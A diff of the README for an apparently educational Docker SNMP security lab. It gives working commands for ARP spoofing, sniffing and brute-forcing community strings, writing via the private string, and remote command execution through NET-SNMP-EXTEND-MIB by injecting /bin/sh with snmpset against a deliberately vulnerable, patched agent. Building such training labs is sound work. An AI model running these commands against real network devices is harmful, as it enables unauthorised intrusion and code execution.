@@ -8,7 +8,7 @@ Demonstrates the vulnerabilities covered in the "SNMP Security Issues" slide usi
 | Default guessable strings | Both are in the bundled `community.txt` wordlist |
 | Information disclosure | Full MIB dump: OS, processes, interfaces, software, users |
 | No integrity (read-write) | PoC confirms `private` has write permission on sysContact |
-| RCE via NET-SNMP-EXTEND-MIB | PoC detects nsExtendObjects and flags the target as exploitable |
+| RCE via NET-SNMP-EXTEND-MIB | Attacker injects an arbitrary command via SNMP SET and reads its output |
 
 ## Lab topology
 
@@ -36,7 +36,8 @@ The snmpPoC files live on your Mac at `labs/snmp/snmpPoC/` and are mounted read-
 snmp/
 ├── docker-compose.yml   ← agent + manager + attacker on one bridge network
 ├── agent/
-│   ├── Dockerfile       ← Net-SNMP snmpd (SNMPv1/v2c)
+│   ├── Dockerfile       ← Net-SNMP 5.9.4 built from source (GitHub) on Alpine 3.19
+│   │                       ENABLE_EXTEND_WRITE_ACCESS patched to 1 to allow SNMP SET RCE
 │   └── snmpd.conf       ← intentionally vulnerable config (public/private, extend RCE)
 ├── manager/
 │   ├── Dockerfile       ← Net-SNMP client
@@ -50,9 +51,25 @@ snmp/
 
 ## Start the lab
 
+First time (builds images):
+
 ```bash
-docker compose up --build
+docker compose up --build -d
 ```
+
+Subsequently (reuses existing images):
+
+```bash
+docker compose up -d
+```
+
+## Open a shell in the attacker container
+
+```bash
+docker exec -it snmp-attacker bash
+```
+
+Run the lab commands from inside that shell. To run a single command without entering it, use `docker exec snmp-attacker <command>`.
 
 ---
 
@@ -62,17 +79,21 @@ Docker bridge networks behave like a switch: unicast packets between two contain
 
 Open three terminals.
 
-Terminal 1 - ARP spoof both directions:
+Terminal 1 - ARP spoof agent toward manager:
 
 ```bash
-AGENT_IP=$(docker inspect snmp-agent   --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
+AGENT_IP=$(docker inspect snmp-agent --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
 MANAGER_IP=$(docker inspect snmp-manager --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
-
-docker exec snmp-attacker arpspoof -i eth0 -t $MANAGER_IP $AGENT_IP &
-docker exec snmp-attacker arpspoof -i eth0 -t $AGENT_IP $MANAGER_IP &
+docker exec snmp-attacker arpspoof -i eth0 -t $MANAGER_IP $AGENT_IP
 ```
 
-Terminal 2 - passive tcpdump on the attacker (not generating any SNMP traffic itself):
+Terminal 2 - ARP spoof manager toward agent:
+
+```bash
+docker exec snmp-attacker arpspoof -i eth0 -t $AGENT_IP $MANAGER_IP
+```
+
+Terminal 3 - passive tcpdump on the attacker:
 
 ```bash
 docker exec snmp-attacker tcpdump -i eth0 -n -A udp port 161
@@ -85,12 +106,6 @@ The manager polls the agent every 5 seconds. You will see `C="public"` appear in
 ## Exercise 1 - Community string brute-force and version detection
 
 The script iterates every entry in `community.txt` against sysDescr OID (`1.3.6.1.2.1.1.1.0`). It also re-tests the first valid string against SNMPv1 and SNMPv3 noAuthNoPriv.
-
-Run with the PoC:
-
-```bash
-docker exec -it snmp-attacker bash -c "cd /snmpPoC && ./snmp.sh --ip snmp-agent"
-```
 
 Expected output:
 
@@ -105,9 +120,9 @@ Expected output:
 Manual equivalents:
 
 ```bash
-docker exec snmp-attacker snmpget -t 1 -r 0 -v 2c -c public   snmp-agent 1.3.6.1.2.1.1.1.0
-docker exec snmp-attacker snmpget -t 1 -r 0 -v 2c -c private  snmp-agent 1.3.6.1.2.1.1.1.0
-docker exec snmp-attacker snmpget -t 1 -r 0 -v 1   -c public  snmp-agent 1.3.6.1.2.1.1.1.0
+docker exec snmp-attacker snmpget -t 1 -r 0 -v 2c -c public  snmp-agent 1.3.6.1.2.1.1.1.0
+docker exec snmp-attacker snmpget -t 1 -r 0 -v 2c -c private snmp-agent 1.3.6.1.2.1.1.1.0
+docker exec snmp-attacker snmpget -t 1 -r 0 -v 1  -c public  snmp-agent 1.3.6.1.2.1.1.1.0
 ```
 
 ---
@@ -154,15 +169,22 @@ Expected output:
 Manual equivalents:
 
 ```bash
-docker exec snmp-attacker snmpset -v 2c -c private snmp-agent sysLocation.0 s "Pwned by attacker"
-docker exec snmp-attacker snmpget -v 2c -c public  snmp-agent sysLocation.0
+docker exec snmp-attacker snmpget  -v 2c -c public  snmp-agent sysLocation.0
+docker exec snmp-attacker snmpset  -v 2c -c private snmp-agent sysLocation.0 s "Pwned by attacker"
+docker exec snmp-attacker snmpget  -v 2c -c public  snmp-agent sysLocation.0
 ```
 
 ---
 
-## Exercise 4 - RCE detection and exploitation via NET-SNMP-EXTEND-MIB
+## Exercise 4 - RCE via NET-SNMP-EXTEND-MIB
 
 The script walks `1.3.6.1.4.1.8072.1.3.2` (nsExtendObjects) and checks for INTEGER-typed entries, which confirm the EXTEND-MIB module is active.
+
+Run with the PoC:
+
+```bash
+docker exec -it snmp-attacker bash -c "cd /snmpPoC && ./snmp.sh --ip snmp-agent"
+```
 
 Expected output:
 
@@ -170,24 +192,42 @@ Expected output:
 [INFO] Target snmp-agent might be Exploitable!
 ```
 
-Trigger the pre-loaded commands to confirm code execution:
+The full SNMP dump is locally written to `snmpPoC/snmp_log.txt` on the laptop. Read it after the script finishes:
 
 ```bash
-docker exec snmp-attacker snmpwalk -v 2c -c public snmp-agent nsExtendOutput1
-# NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."whoami"   = STRING: root
-# NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."hostname" = STRING: lab-agent
+cat snmpPoC/snmp_log.txt
 ```
 
-Register a new command using the read-write community string:
+### Read output from pre-loaded commands
+
+The agent ships with two pre-loaded extend commands (`whoami`, `hostname`) that run on every read:
 
 ```bash
-docker exec snmp-attacker snmpset -v 2c -c private snmp-agent \
-  'nsExtendStatus."id"'   i 4 \
-  'nsExtendCommand."id"'  s '/usr/bin/id' \
-  'nsExtendArgs."id"'     s ''
+docker exec snmp-attacker snmpwalk -m +NET-SNMP-EXTEND-MIB -v 2c -c public snmp-agent NET-SNMP-EXTEND-MIB::nsExtendOutput1Line
+```
 
-docker exec snmp-attacker snmpwalk -v 2c -c public snmp-agent 'nsExtendOutput1."id"'
-# NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."id" = STRING: uid=0(root) gid=0(root) ...
+### Inject an arbitrary command via SNMP SET
+
+Using the `private` read-write community string, an attacker can register a new command into the agent at runtime with no config file access:
+
+```bash
+docker exec snmp-attacker snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private snmp-agent \
+  'nsExtendStatus."id"'  = createAndGo \
+  'nsExtendCommand."id"' = /bin/sh \
+  'nsExtendArgs."id"'    = '-c id'
+```
+
+Read the output back:
+
+```bash
+docker exec snmp-attacker snmpwalk -m +NET-SNMP-EXTEND-MIB -v2c -c public snmp-agent NET-SNMP-EXTEND-MIB::nsExtendOutput1Line
+```
+
+The injected row is volatile and disappears on agent restart. To clean it up manually:
+
+```bash
+docker exec snmp-attacker snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private snmp-agent \
+  'nsExtendStatus."id"' = destroy
 ```
 
 ---
